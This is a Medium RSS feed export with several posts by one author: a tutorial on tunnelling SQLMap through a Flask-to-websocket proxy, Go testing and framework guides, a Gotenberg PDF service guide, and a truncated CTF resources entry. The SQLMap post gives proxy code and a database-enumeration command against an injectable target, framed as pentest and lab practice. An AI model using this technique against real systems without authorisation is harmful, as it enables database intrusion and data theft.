{
  "Channel": {
    "Title": "Stories by Francesco Pastore on Medium",
    "Description": "Stories by Francesco Pastore on Medium",
    "Link": "",
    "Image": "\n            \n            \n            \n        ",
    "Items": [
      {
        "Title": "SQLMap over websockets",
        "Description": "",
        "Link": "https://2h3ph3rd.medium.com/sqlmap-over-websockets-353cdcd9a7ab?source=rss-5a9085122896------2",
        "PubDate": "Wed, 08 Mar 2023 19:17:29 GMT",
        "Creator": "Francesco Pastore",
        "Category": [
          "penetration-testing",
          "sqlmap",
          "hacking",
          "htb",
          "sqli"
        ],
        "Guid": "https://medium.com/p/353cdcd9a7ab",
        "Content": "\u003cp\u003eSQLMap is a powerful open-source tool that is widely used for detecting and exploiting SQL injection vulnerabilities in web applications. It simplifies the process of identifying SQLi vulnerabilities, determining the type of database, and extracting sensitive information from the database.\u003c/p\u003e\u003cp\u003eHowever, there are some limitations to SQLMap. For instance, it may not support certain types of requests, such as those made over websockets. Additionally, working with complex targets can be challenging using SQLMap alone.\u003c/p\u003e\u003cp\u003eIn this article, we will explore a possible solution to these issues that requires minimal effort and makes also simpler to work with SQLMap.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/724/0*502zIH_5Es2DPmha.png\" /\u003e\u003c/figure\u003e\u003ch3\u003eThe idea\u003c/h3\u003e\u003cp\u003eTo simplify the process the idea is to set up a fake server as an intermediary. With this approach, SQLMap would make a request to the fake server using a common format, and the fake server would then make the more complex request to the actual target.\u003c/p\u003e\u003cp\u003eIn this way, SQLMap can be used to test the fake server, which serves as a proxy for the real target. This method can be particularly useful when dealing with complex targets or requests that are not supported by SQLMap.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/942/1*Q_CM9PS1kwvPMvzteo8Eag.png\" /\u003e\u003cfigcaption\u003eA simple representation of the process\u003c/figcaption\u003e\u003c/figure\u003e\u003ch3\u003e\u003cstrong\u003ePrepare the environment\u003c/strong\u003e\u003c/h3\u003e\u003cp\u003eTo set up the server, we will be using Python along with the Flask and Websocket libraries. To get started, we will create a virtual environment and install the necessary packages using pip.\u003c/p\u003e\u003cpre\u003epython3 -m venv .venv\u003cbr\u003esource .venv/bin/activate\u003cbr\u003epython3 -m pip install flask websocket\u003c/pre\u003e\u003cp\u003eOnce the installation is complete, the server can be launched using a simple command. It will be available on localhost by default over the port 5000.\u003c/p\u003e\u003cpre\u003eflask run\u003c/pre\u003e\u003ch3\u003eThe main server\u003c/h3\u003e\u003cp\u003eTo set up the server, all we need to do is define an endpoint that should take one or more query parameters as input and use them to create the request.\u003c/p\u003e\u003cpre\u003efrom flask import Flask, request\u003cbr\u003efrom websocket import create_connection\u003cbr\u003e\u003cbr\u003eapp = Flask(__name__)\u003cbr\u003e\u003cbr\u003ews_url = \u0026quot;ws://website.com\u0026quot; # put here the ws base url\u003cbr\u003e\u003cbr\u003e# it expects a request like /?query=something\u003cbr\u003e@app.route(\u0026quot;/\u0026quot;)\u003cbr\u003edef handle():\u003cbr\u003e    # query is the query param name used by this endpoint\u003cbr\u003e    args = request.args\u003cbr\u003e    id = args.get(\u0026#39;query\u0026#39;)\u003cbr\u003e\u003cbr\u003e    ws = create_connection(ws_url)\u003cbr\u003e\u003cbr\u003e    # in this example, the websocket endpoint\u003cbr\u003e    # expects a json with an id parameter\u003cbr\u003e    # that is vulnerable to sqli\u003cbr\u003e    payload = \u0026#39;{\u0026quot;id\u0026quot;:\u0026quot;%s\u0026quot;}\u0026#39; % id\u003cbr\u003e \u003cbr\u003e    ws.send(payload)\u003cbr\u003e    res = ws.recv()\u003cbr\u003e    ws.close()\u003cbr\u003e\u003cbr\u003e    if res:\u003cbr\u003e        return res\u003cbr\u003e    else:\u003c/pre\u003e\u003cp\u003eIn this code, the victim is expected to receive a websocket message containing a JSON object with an ID. The server intercepts the SQLMap request, extracts the ID passed as query, and sent it on to the actual target. This allows SQLMap to be used to test the fake server, which serves as a proxy for the real target.\u003c/p\u003e\u003cp\u003eIt is important to note that the server must be running before SQLMap can be executed. Also, be careful to call this file as “app.py” to make it recognizable by flask. Otherwise, you should change the value of the FLASK_APP environment variable.\u003c/p\u003e\u003ch3\u003eRun SQLMap\u003c/h3\u003e\u003cp\u003eTo run SQLMap, you simply need to provide the correct URL that includes the query parameter(s) and SQLMap will take care of the rest.\u003c/p\u003e\u003cp\u003eOnce SQLMap is executed, it will be able to scan the victim by going through the fake server that we created.\u003c/p\u003e\u003cpre\u003esqlmap -u \u0026quot;http://localhost:5000/?query=1\u0026quot; --batch --dbs\u003c/pre\u003e\u003ch3\u003eSummary\u003c/h3\u003e\u003cp\u003eFor your convenience, I leave here a Gist that summarizes the key points of this article.\u003c/p\u003e\u003ciframe src=\"\" width=\"0\" height=\"0\" frameborder=\"0\" scrolling=\"no\"\u003e\u003ca href=\"https://medium.com/media/baca13a17d430e9b0e80a8dead1fff91/href\"\u003ehttps://medium.com/media/baca13a17d430e9b0e80a8dead1fff91/href\u003c/a\u003e\u003c/iframe\u003e\u003ciframe src=\"\" width=\"0\" height=\"0\" frameborder=\"0\" scrolling=\"no\"\u003e\u003ca href=\"https://medium.com/media/98c345148d16c58f2bcd27c683c6896e/href\"\u003ehttps://medium.com/media/98c345148d16c58f2bcd27c683c6896e/href\u003c/a\u003e\u003c/iframe\u003e\u003cimg src=\"https://medium.com/_/stat?event=post.clientViewed\u0026referrerSource=full_rss\u0026postId=353cdcd9a7ab\" width=\"1\" height=\"1\" alt=\"\"\u003e"
      },
      {
        "Title": "Table driven testing in Go",
        "Description": "",
        "Link": "https://2h3ph3rd.medium.com/table-driven-testing-in-go-c6816ac32448?source=rss-5a9085122896------2",
        "PubDate": "Tue, 28 Feb 2023 20:39:59 GMT",
        "Creator": "Francesco Pastore",
        "Category": [
          "go",
          "table-driven-testing",
          "programming",
          "test",
          "golang"
        ],
        "Guid": "https://medium.com/p/c6816ac32448",
        "Content": "\u003cp\u003eTesting your code is a crucial step in the development process. However, it can become cumbersome and time-consuming, especially when dealing with a large number of test cases. Manually copying and pasting code to test each case is not an clean solution.\u003c/p\u003e\u003cp\u003eIn this article we will look to table driven tests in Go to write your test in a fast and efficient way. This approach offers several benefits, including faster test writing, easier maintenance, and improved test coverage.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/960/1*NJNnND9gAvqjubOULYAQYg.png\" /\u003e\u003c/figure\u003e\u003ch3\u003e\u003cstrong\u003eWhy a table?\u003c/strong\u003e\u003c/h3\u003e\u003cp\u003eTable-driven testing is an approach that allows us to define and execute multiple test cases in a straightforward way. The idea is to create a “table” made up of an array of structs, where we can store the input, expected output, and any other relevant information for each test case.\u003c/p\u003e\u003cpre\u003etests := []struct {\u003cbr\u003e  // parameter\u003cbr\u003e  param1 int\u003cbr\u003e  param2 string\u003cbr\u003e  param3 interface{} // useful for complex values\u003cbr\u003e  // ...\u003cbr\u003e\u003cbr\u003e  // results\u003cbr\u003e  expected1 string\u003cbr\u003e  expected2 int\u003cbr\u003e  // ...\u003cbr\u003e\u003cbr\u003e  err error\u003cbr\u003e }{}\u003c/pre\u003e\u003cp\u003eOnce we have defined our test cases, we can iterate over the array and execute the function under test for each input, verifying that the actual output matches the expected output for each case.\u003c/p\u003e\u003cpre\u003efor _, test := range tests {\u003cbr\u003e  actual := function(test.param)\u003cbr\u003e  assert.Equal(t, test.expected, actual)\u003cbr\u003e}\u003c/pre\u003e\u003cp\u003eBy using this approach, we can write more concise and maintainable test code that covers a wide range of scenarios. We can also easily extend our test suite by adding new test cases to the table, without having to duplicate test code or write new test functions.\u003c/p\u003e\u003cp\u003eWhile it may require some initial effort, this method can ultimately simplify and streamline your code, making it cleaner and more readable.\u003c/p\u003e\u003ch3\u003e\u003cstrong\u003eA simple example\u003c/strong\u003e\u003c/h3\u003e\u003cp\u003eConsider a function that takes in input an email and checks if it is valid or not by returning a boolean.\u003c/p\u003e\u003cpre\u003epackage main\u003cbr\u003e\u003cbr\u003eimport (\u003cbr\u003e \u0026quot;regexp\u0026quot;\u003cbr\u003e)\u003cbr\u003e\u003cbr\u003e// CheckEmail returns true if the given string is a valid email, otherwise false\u003cbr\u003efunc CheckEmail(email string) bool {\u003cbr\u003e pattern := `^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$`\u003cbr\u003e reg := regexp.MustCompile(pattern)\u003cbr\u003e return reg.MatchString(email)\u003cbr\u003e}\u003c/pre\u003e\u003cp\u003eIn this case of testing a function that takes an email address as input and returns a boolean, we can define a struct with two fields: one for the email input and one for the expected boolean output.\u003c/p\u003e\u003cp\u003eIn testing, it’s common to compare an “actual” value (the value returned by the function under test) with an “expected” value (the value we expect the function to return given a specific input).\u003c/p\u003e\u003cpre\u003epackage main\u003cbr\u003e\u003cbr\u003eimport (\u003cbr\u003e \u0026quot;fmt\u0026quot;\u003cbr\u003e \u0026quot;testing\u0026quot;\u003cbr\u003e\u003cbr\u003e \u0026quot;github.com/stretchr/testify/assert\u0026quot;\u003cbr\u003e)\u003cbr\u003e\u003cbr\u003efunc TestCheckEmail(t *testing.T) {\u003cbr\u003e tests := []struct {\u003cbr\u003e  email    string\u003cbr\u003e  expected bool\u003cbr\u003e }{\u003cbr\u003e  {\u0026quot;email@email.com\u0026quot;, true},\u003cbr\u003e  {\u0026quot;123@email.com\u0026quot;, true},\u003cbr\u003e  {\u0026quot;email_email_email@email.com\u0026quot;, true},\u003cbr\u003e  {\u0026quot;email.email.email@email.com\u0026quot;, true},\u003cbr\u003e  {\u0026quot;email!@email.com\u0026quot;, false},\u003cbr\u003e  {\u0026quot;email@email\u0026quot;, false},\u003cbr\u003e  {\u0026quot;email\u0026quot;, false},\u003cbr\u003e  {\u0026quot;@email.com\u0026quot;, false},\u003cbr\u003e  {\u0026quot;@email\u0026quot;, false},\u003cbr\u003e }\u003cbr\u003e\u003cbr\u003e for i, test := range tests {\u003cbr\u003e  actual := CheckEmail(test.email)\u003cbr\u003e\u003cbr\u003e  msg := fmt.Sprintf(\u0026quot;test %d with email %s\u0026quot;, i, test.email)\u003cbr\u003e  assert.Equal(t, test.expected, actual, msg)\u003cbr\u003e }\u003cbr\u003e}\u003c/pre\u003e\u003cp\u003eIndeed, as you can see in this example, we can test multiple cases in just a few lines of code by using the table-driven approach. This technique can save us time and effort while ensuring that our tests cover a wide range of scenarios.\u003c/p\u003e\u003cp\u003eMoreover, adding a new test case is straightforward since all we have to do is add a new entry to the array, with the input and the expected output.\u003c/p\u003e\u003cp\u003eThis way, we can easily extend our test suite and cover more edge cases, without having to write additional test functions or duplicating code. By using the table-driven approach, we can keep our test code clean, concise, and maintainable, which can save us time and effort in the long run.\u003c/p\u003e\u003ch3\u003eAdd a custom message\u003c/h3\u003e\u003cp\u003eIt is possible to add an additional field to the struct for a custom message to be shown in case of an error. This can be particularly useful when debugging failures or identifying issues within your tests.\u003c/p\u003e\u003cp\u003eFor example, suppose we want to add a custom error message to the test case we previously discussed. In that case, we could modify the struct to include a field with a descriptive error message that will be displayed if the test fails.\u003c/p\u003e\u003cpre\u003efunc TestCheckEmailWithMessage(t *testing.T) {\u003cbr\u003e tests := []struct {\u003cbr\u003e  email    string\u003cbr\u003e  expected bool\u003cbr\u003e  message  string\u003cbr\u003e }{\u003cbr\u003e  {\u0026quot;email@email.com\u0026quot;, true, \u0026quot;standard email\u0026quot;},\u003cbr\u003e  {\u0026quot;123@email.com\u0026quot;, true, \u0026quot;numbers should be accepted\u0026quot;},\u003cbr\u003e  {\u0026quot;email_email_email@email.com\u0026quot;, true, \u0026quot;underscores should be accepted\u0026quot;},\u003cbr\u003e  {\u0026quot;email.email.email@email.com\u0026quot;, true, \u0026quot;dots should be accepted\u0026quot;},\u003cbr\u003e  {\u0026quot;email!@email.com\u0026quot;, false, \u0026quot;special character not allowed\u0026quot;},\u003cbr\u003e  {\u0026quot;email@email\u0026quot;, false, \u0026quot;bad domain given\u0026quot;},\u003cbr\u003e  {\u0026quot;email\u0026quot;, false, \u0026quot;no domain given\u0026quot;},\u003cbr\u003e  {\u0026quot;@email.com\u0026quot;, false, \u0026quot;no username given\u0026quot;},\u003cbr\u003e  {\u0026quot;@email\u0026quot;, false, \u0026quot;no username and bad domain given\u0026quot;},\u003cbr\u003e }\u003cbr\u003e\u003cbr\u003e for _, test := range tests {\u003cbr\u003e  actual := CheckEmail(test.email)\u003cbr\u003e  assert.Equal(t, test.expected, actual, test.message)\u003cbr\u003e }\u003cbr\u003e}\u003c/pre\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/381/1*uDnISx34QBgsYJ6lUPfvBw.png\" /\u003e\u003c/figure\u003e\u003ch3\u003eHandle a lot of parameters\u003c/h3\u003e\u003cp\u003eWhen dealing with a large number of parameters, it can become challenging to manage them effectively. In such situations, creating multiple structs, each designed to handle a specific aspect of the problem, can be a better approach. These structs can be organized as separate arrays with the same number of elements, simplifying their management.\u003c/p\u003e\u003cp\u003eThis technique can prove especially helpful when mocking an interface, where numerous methods are called by the function under test. By dividing the parameters into multiple structs, you can improve the organization and readability of your code, making it easier to maintain and debug.\u003c/p\u003e\u003cpre\u003efunc TestMultipleStructs(t *testing.T) {\u003cbr\u003e func1 := []struct {\u003cbr\u003e  param  string\u003cbr\u003e  result int\u003cbr\u003e  err    error\u003cbr\u003e }{}\u003cbr\u003e\u003cbr\u003e func2 := []struct {\u003cbr\u003e  param1 time.Time\u003cbr\u003e  param2 string\u003cbr\u003e  result string\u003cbr\u003e  err    error\u003cbr\u003e }{}\u003cbr\u003e\u003cbr\u003e tests := []struct {\u003cbr\u003e  param    int\u003cbr\u003e  expected string\u003cbr\u003e  err      error\u003cbr\u003e }{}\u003cbr\u003e\u003cbr\u003e // check same number of test cases\u003cbr\u003e assert.Len(t, func1, len(func2))\u003cbr\u003e\u003cbr\u003e for i := range func1 {\u003cbr\u003e  // do something with func1[i]\u003cbr\u003e  f1 := func1[i]\u003cbr\u003e  mock.Interface.EXPECT().Func1(f1.param).Return(f1.result, f1.err)\u003cbr\u003e\u003cbr\u003e  // do something with func2[i]\u003cbr\u003e  f2 := func2[i]\u003cbr\u003e  mock.Interface.EXPECT().Func2(f2.param1, f2.param2).Return(f2.result, f2.err)\u003cbr\u003e\u003cbr\u003e  // check result\u003cbr\u003e  test := tests[i]\u003cbr\u003e  actual, err := FunctionToTest(test.param)\u003cbr\u003e  assert.Equal(t, test.expected, actual)\u003cbr\u003e  if test.err == nil {\u003cbr\u003e   assert.Nil(t, err)\u003cbr\u003e  } else {\u003cbr\u003e   assert.EqualError(t, err, test.err.Error())\u003cbr\u003e  }\u003cbr\u003e }\u003cbr\u003e}\u003c/pre\u003e\u003cp\u003eThe next time you write a test, consider how you can structure it with the table driven approach. Overall, taking the time to structure your tests in this way can lead to more robust and reliable code, making it a worthwhile investment in the quality of your software.\u003c/p\u003e\u003cimg src=\"https://medium.com/_/stat?event=post.clientViewed\u0026referrerSource=full_rss\u0026postId=c6816ac32448\" width=\"1\" height=\"1\" alt=\"\"\u003e"
      },
      {
        "Title": "Five web frameworks for Go",
        "Description": "",
        "Link": "https://2h3ph3rd.medium.com/five-web-frameworks-for-go-3b9036b319ff?source=rss-5a9085122896------2",
        "PubDate": "Thu, 09 Feb 2023 21:00:45 GMT",
        "Creator": "Francesco Pastore",
        "Category": [
          "api",
          "web-development",
          "go",
          "golang",
          "web-framework"
        ],
        "Guid": "https://medium.com/p/3b9036b319ff",
        "Content": "\u003cp\u003eGo is becoming one of the most widely used languages for creating APIs because of its simplicity and speed. In fact, compared to other languages such as Python or Javascript, a Go program is strongly and statically typed, and compiled directly, allowing for higher performance.\u003c/p\u003e\u003cp\u003eThere are many web frameworks available for Go, in this article we will look at five of the most popular ones.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/800/1*eAJ-FM3yaoZbtXhJzPVMUg.jpeg\" /\u003e\u003c/figure\u003e\u003ch3\u003eGin\u003c/h3\u003e\u003cp\u003eGin is a highly popular web framework (66K stars on Github!) for the Go programming language, known for its simplicity and speed. Its popularity makes it a common choice for new projects with a long-term vision.\u003c/p\u003e\u003cp\u003eGin provides a variety of interfaces and structures to simplify development, such as the specific gin context and a streamlined middleware structure. However, it may take some time for developers familiar with the standard net/http package to fully understand and utilize all of Gin’s features.\u003c/p\u003e\u003ch4\u003ePro\u003c/h4\u003e\u003cul\u003e\u003cli\u003eFast and lightweight\u003c/li\u003e\u003cli\u003eActive community\u003c/li\u003e\u003c/ul\u003e\u003ch4\u003eCons\u003c/h4\u003e\u003cul\u003e\u003cli\u003eDifferent than net/http\u003c/li\u003e\u003cli\u003eHigh learning curve\u003c/li\u003e\u003c/ul\u003e\u003cpre\u003epackage main\u003cbr\u003e\u003cbr\u003eimport \u0026quot;github.com/gin-gonic/gin\u0026quot;\u003cbr\u003e\u003cbr\u003efunc main() {\u003cbr\u003e r := gin.Default()\u003cbr\u003e r.GET(\u0026quot;/ping\u0026quot;, func(c *gin.Context) {\u003cbr\u003e  c.JSON(200, gin.H{\u003cbr\u003e   \u0026quot;message\u0026quot;: \u0026quot;pong\u0026quot;,\u003cbr\u003e  })\u003cbr\u003e })\u003cbr\u003e r.Run() // listen and serve on 0.0.0.0:8080\u003cbr\u003e}\u003c/pre\u003e\u003cul\u003e\u003cli\u003e\u003ca href=\"https://gin-gonic.com\"\u003eGin Web Framework\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://github.com/gin-gonic/gin\"\u003eGitHub - gin-gonic/gin: Gin is a HTTP web framework written in Go (Golang). It features a Martini-like API with much better performance -- up to 40 times faster. If you need smashing performance, get yourself some Gin.\u003c/a\u003e\u003c/li\u003e\u003c/ul\u003e\u003ch3\u003eFiber\u003c/h3\u003e\u003cp\u003eFiber is a web framework for Go that is built on the fasthttp package, making it faster than other frameworks. However, this also comes with some drawbacks.\u003c/p\u003e\u003cp\u003eBecause fasthttp is relatively new and not fully developed like the net/http package, currently it has several shortcomings, such as support for HTTP/2. If you are considering using this framework, it is important to consider whether the features provided are sufficient for your project needs.\u003c/p\u003e\u003ch4\u003ePro\u003c/h4\u003e\u003cul\u003e\u003cli\u003eFast\u003c/li\u003e\u003cli\u003eWell documented\u003c/li\u003e\u003cli\u003eA lot of middlewares available\u003c/li\u003e\u003c/ul\u003e\u003ch4\u003eCons\u003c/h4\u003e\u003cul\u003e\u003cli\u003eNo HTTP/2 support\u003c/li\u003e\u003cli\u003efasthttp is not fully completed as net/http\u003c/li\u003e\u003c/ul\u003e\u003cpre\u003epackage main\u003cbr\u003e\u003cbr\u003eimport \u0026quot;github.com/gofiber/fiber/v2\u0026quot;\u003cbr\u003e\u003cbr\u003efunc main() {\u003cbr\u003e    app := fiber.New()\u003cbr\u003e\u003cbr\u003e    app.Get(\u0026quot;/\u0026quot;, func(c *fiber.Ctx) error {\u003cbr\u003e        return c.SendString(\u0026quot;Hello, World 👋!\u0026quot;)\u003cbr\u003e    })\u003cbr\u003e\u003cbr\u003e    app.Listen(\u0026quot;:3000\u0026quot;)\u003cbr\u003e}\u003c/pre\u003e\u003cul\u003e\u003cli\u003e\u003ca href=\"https://gofiber.io/\"\u003eFiber\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://github.com/gofiber/fiber\"\u003eGitHub - gofiber/fiber: ⚡️ Express inspired web framework written in Go\u003c/a\u003e\u003c/li\u003e\u003c/ul\u003e\u003ch3\u003eGo Chi\u003c/h3\u003e\u003cp\u003eGo Chi is a less well-known web framework for Go, but its simplicity, lightweight structure, and speed make it a solid choice for web development. Also, its similarities to the now-archived Gorilla/mux project have made it a popular substitute.\u003c/p\u003e\u003cp\u003eThe framework has well-written documentation and a variety of out-of-the-box middlewares such as JWT authentication, logging, and rate limiting. All of these features make Chi a good option for your next web project.\u003c/p\u003e\u003ch4\u003ePro\u003c/h4\u003e\u003cul\u003e\u003cli\u003eNo external dependencies\u003c/li\u003e\u003cli\u003eFully compatible with standard net/http package but…\u003c/li\u003e\u003c/ul\u003e\u003ch4\u003eCons\u003c/h4\u003e\u003cul\u003e\u003cli\u003e… sometimes could be too verbose\u003c/li\u003e\u003cli\u003eMaintenance is not high at the moment.\u003c/li\u003e\u003c/ul\u003e\u003cpre\u003epackage main\u003cbr\u003e\u003cbr\u003eimport (\u003cbr\u003e    \u0026quot;net/http\u0026quot;\u003cbr\u003e\u003cbr\u003e    \u0026quot;github.com/go-chi/chi/v5\u0026quot;\u003cbr\u003e    \u0026quot;github.com/go-chi/chi/v5/middleware\u0026quot;\u003cbr\u003e)\u003cbr\u003e\u003cbr\u003efunc main() {\u003cbr\u003e    r := chi.NewRouter()\u003cbr\u003e    r.Use(middleware.Logger)\u003cbr\u003e    r.Get(\u0026quot;/\u0026quot;, func(w http.ResponseWriter, r *http.Request) {\u003cbr\u003e        w.Write([]byte(\u0026quot;Hello World!\u0026quot;))\u003cbr\u003e    })\u003cbr\u003e    http.ListenAndServe(\u0026quot;:3000\u0026quot;, r)\u003cbr\u003e}\u003c/pre\u003e\u003cul\u003e\u003cli\u003e\u003ca href=\"https://go-chi.io\"\u003ego-chi docs\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://github.com/go-chi/chi\"\u003eGitHub - go-chi/chi: lightweight, idiomatic and composable router for building Go HTTP services\u003c/a\u003e\u003c/li\u003e\u003c/ul\u003e\u003ch3\u003eEcho\u003c/h3\u003e\u003cp\u003eEcho is a web framework for Go that is designed for high performance and ease of use. It is built on top of the net/http package and a structure very similar to Gin.\u003c/p\u003e\u003cp\u003eEcho also provides a wide range of built-in middleware for tasks such as logging, recovery, and CORS, as well as support for custom middleware. It is also extensible and has support for template rendering, WebSockets, and HTTP/2.\u003c/p\u003e\u003ch4\u003ePro\u003c/h4\u003e\u003cul\u003e\u003cli\u003e\u003ca href=\"https://echo.labstack.com/middleware/\"\u003eA big collection of middlewares\u003c/a\u003e\u003c/li\u003e\u003c/ul\u003e\u003ch4\u003eCons\u003c/h4\u003e\u003cul\u003e\u003cli\u003eNot so popular as Gin\u003c/li\u003e\u003c/ul\u003e\u003cpre\u003epackage main\u003cbr\u003e\u003cbr\u003eimport (\u003cbr\u003e \u0026quot;net/http\u0026quot;\u003cbr\u003e \u003cbr\u003e \u0026quot;github.com/labstack/echo/v4\u0026quot;\u003cbr\u003e)\u003cbr\u003e\u003cbr\u003efunc main() {\u003cbr\u003e e := echo.New()\u003cbr\u003e e.GET(\u0026quot;/\u0026quot;, func(c echo.Context) error {\u003cbr\u003e  return c.String(http.StatusOK, \u0026quot;Hello, World!\u0026quot;)\u003cbr\u003e })\u003cbr\u003e e.Logger.Fatal(e.Start(\u0026quot;:1323\u0026quot;))\u003cbr\u003e}\u003c/pre\u003e\u003ch3\u003eRevel\u003c/h3\u003e\u003cp\u003eRevel is a web framework that is built around the Model-View-Controller architecture. This makes it a great choice for projects that adhere to this design pattern, but it may not be the best fit for others.\u003c/p\u003e\u003cp\u003eAdditionally, Revel offers hot reloading and an excellent documentation. However, it lacks some important elements for a MVC framework like an ORM or an advanced template engine.\u003c/p\u003e\u003ch4\u003ePro\u003c/h4\u003e\u003cul\u003e\u003cli\u003eHot reloading\u003c/li\u003e\u003cli\u003eGood documentation\u003c/li\u003e\u003cli\u003eMVC support but…\u003c/li\u003e\u003c/ul\u003e\u003ch4\u003eCons\u003c/h4\u003e\u003cul\u003e\u003cli\u003e… if you don’t use MVC it could be troublesome\u003c/li\u003e\u003cli\u003eORM must be installed manually if needed\u003c/li\u003e\u003cli\u003eFew middlewares available (what about a rate limiter or a jwt auth middleware?)\u003c/li\u003e\u003c/ul\u003e\u003cul\u003e\u003cli\u003e\u003ca href=\"https://revel.github.io/\"\u003eRevel\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://github.com/revel/revel\"\u003eGitHub - revel/revel: A high productivity, full-stack web framework for the Go language.\u003c/a\u003e\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eI hope this article has been useful for your next Go project. There are many web frameworks out there; here we have reviewed just five of the most popular ones.\u003c/p\u003e\u003cimg src=\"https://medium.com/_/stat?event=post.clientViewed\u0026referrerSource=full_rss\u0026postId=3b9036b319ff\" width=\"1\" height=\"1\" alt=\"\"\u003e"
      },
      {
        "Title": "The all-in-one microservice to manage PDF",
        "Description": "",
        "Link": "https://2h3ph3rd.medium.com/the-all-in-one-microservice-to-manage-pdf-in-your-app-7fe2e8178391?source=rss-5a9085122896------2",
        "PubDate": "Sun, 27 Nov 2022 09:41:17 GMT",
        "Creator": "Francesco Pastore",
        "Category": [
          "microservices",
          "go",
          "api",
          "backend",
          "pdf"
        ],
        "Guid": "https://medium.com/p/7fe2e8178391",
        "Content": "\u003cp\u003ePDF is one of the most common ways used to share data. It is mainly chosen for portability because a PDF file structure does not change between different systems.\u003c/p\u003e\u003cp\u003eWorking with PDF in your app could not be a piece of cake. Some languages do not have good libraries and conversions between different file types are not so easy. Don’t worry, Gotenberg can help!\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*PJqq2RP_Pu7Eizc8AjhtRw.jpeg\" /\u003e\u003c/figure\u003e\u003ch4\u003eWait, what is Gotenberg?\u003c/h4\u003e\u003cp\u003eGotenberg is a microservice written in Go and made to be run as a docker container in your server. It allows managing PDF easily by using its very straightforward API.\u003c/p\u003e\u003cp\u003eIn this article, we will some examples of interactions with Gotenberg, but first, how can we start using it?\u003c/p\u003e\u003cp\u003e\u003ca href=\"https://gotenberg.dev\"\u003eGotenberg | Gotenberg\u003c/a\u003e\u003c/p\u003e\u003ch3\u003eInstallation\u003c/h3\u003e\u003cp\u003eGotenberg can be run easily by using the official Docker image from Docker Hub.\u003c/p\u003e\u003cpre\u003edocker run --rm -p 3000:3000 gotenberg/gotenberg:7\u003c/pre\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/786/1*_W8tAC8HqpfWvcCyZxXp3A.png\" /\u003e\u003cfigcaption\u003eOne line and everything is ready\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003eThere is also a live demo available with some limitations. Look to the official documentation for more details about it.\u003c/p\u003e\u003cp\u003e\u003ca href=\"https://gotenberg.dev/docs/get-started/live-demo\"\u003e🔥 Live Demo | Gotenberg\u003c/a\u003e\u003c/p\u003e\u003ch3\u003ePDF merge? No problem!\u003c/h3\u003e\u003cp\u003eIf you need to merge multiple PDF files you can call the endpoint by doing a POST request with the files passed inside the body. Remember to use form files available in every HTTP request library.\u003c/p\u003e\u003cpre\u003ecurl --request POST \u0026#39;http://localhost:3000/forms/pdfengines/merge\u0026#39; \\\u003cbr\u003e  --form \u0026#39;files=@\u0026quot;./sample1.pdf\u0026quot;\u0026#39; \\\u003cbr\u003e  --form \u0026#39;files=@\u0026quot;./sample2.pdf\u0026quot;\u0026#39; \\\u003cbr\u003e  -o merged.pdf\u003c/pre\u003e\u003ch3\u003eOfficial docs\u003c/h3\u003e\u003cp\u003eThere are a lot of features available like Office files to PDF or markdown to PDF. Look to the documentation for all the details about them and the ones shown here.\u003c/p\u003e\u003cp\u003e\u003ca href=\"https://gotenberg.dev/docs/about\"\u003eAbout | Gotenberg\u003c/a\u003e\u003c/p\u003e\u003cp\u003eCustom HTML file to PDF\u003c/p\u003e\u003cpre\u003ecurl \\\u003cbr\u003e--request POST \u0026#39;http://localhost:3000/forms/chromium/convert/html\u0026#39; \\\u003cbr\u003e--form \u0026#39;files=@\u0026quot;./index.html\u0026quot;\u0026#39; \\\u003cbr\u003e-o my.pdf\u003c/pre\u003e\u003cp\u003ePublic website URL to PDF\u003c/p\u003e\u003cpre\u003ecurl \\\u003cbr\u003e--request POST \u0026#39;http://localhost:3000/forms/chromium/convert/url\u0026#39; \\\u003cbr\u003e--form \u0026#39;url=\u0026quot;https://www.google.com\u0026quot;\u0026#39; \\\u003cbr\u003e-o my.pdf\u003c/pre\u003e\u003ch3\u003eOne note about authentication\u003c/h3\u003e\u003cp\u003ePay attention to authentication, it is better to make Gotenberg available only to the internal network. Otherwise, you could add special endpoints to your back end that allows accessing the pod from the Internet.\u003c/p\u003e\u003cp\u003eIn every case remember that Gotenberg has no authentication service, so be careful of whom can access it.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/960/0*DqTPiczhIwOKJCCd.jpg\" /\u003e\u003c/figure\u003e\u003cp\u003eGotenberg can be a big help in your applications if you need to manage PDFs. Give it a try and let me know if you find it useful!\u003c/p\u003e\u003cimg src=\"https://medium.com/_/stat?event=post.clientViewed\u0026referrerSource=full_rss\u0026postId=7fe2e8178391\" width=\"1\" height=\"1\" alt=\"\"\u003e"
      },
      {
        "Title": "Ten resources for binary challenges",
        "Description": "",
        "Link": "https://2h3ph3rd.medium.com/ten-resources-for-binary-challenges-d9c22b8d87a6?source=rss-5a9085122896------2",
        "PubDate": "Sun, 27 Nov 2022 08:58:53 GMT",
        "Creator": "Francesco Pastore",
        "Category": [
          "buffer-overflow",
          "pwn",
          "ctf",
          "exploitation",
          "binary"
        ],
        "Guid": "https://medium.com/p/d9c22b8d87a6",
